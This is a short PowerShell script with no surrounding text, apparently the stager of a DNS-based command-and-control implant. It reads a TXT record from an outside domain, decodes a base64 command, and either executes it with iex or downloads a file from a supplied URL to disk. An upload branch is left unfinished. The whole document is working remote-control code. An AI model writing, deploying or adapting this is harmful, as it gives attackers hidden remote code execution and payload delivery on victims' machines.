$query = Resolve-DnsName -Type TXT -Name down.thomassomerville.com
$results = $query.strings -split ","
$address = $results[0]
$port = $results[1]
$cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))

if ($cmd.StartsWith("EXEC=")){
    $exec = iex($cmd.substring(5))
}
if ($cmd.StartsWith("RUN=")){
    iex($cmd.substring(4))
}
if ($cmd.StartsWith("DOWN=")){
    $downCMD = $cmd.substring(5) -split ","
    Invoke-WebRequest -Uri $downCMD[0] -OutFile $downCMD[1]    
}
if ($cmd.StartsWith("PUT=")){
    $putCMD = $cmd.substring(4) -split ","

}

